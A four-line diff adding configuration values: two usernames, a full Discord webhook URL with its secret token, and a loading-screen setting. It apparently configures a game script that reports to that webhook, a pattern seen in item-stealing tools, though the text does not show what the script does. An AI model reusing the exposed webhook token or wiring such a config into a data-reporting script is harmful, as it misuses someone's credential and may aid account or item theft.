@@ -1,0 +1,4 @@
+ Username = "Notanactoryet"
+Username2 = "Notanactoryet"
+Webhook = "https://discord.com/api/webhooks/1307311935204753458/rDQpQUpIrQe2eCJXEQ6snENC2L9DuCOhrZzwQRmBhhp3L0n6t7scC7As_FPvrqSAHWQV"
+selectedLoadingScreen = "1" 
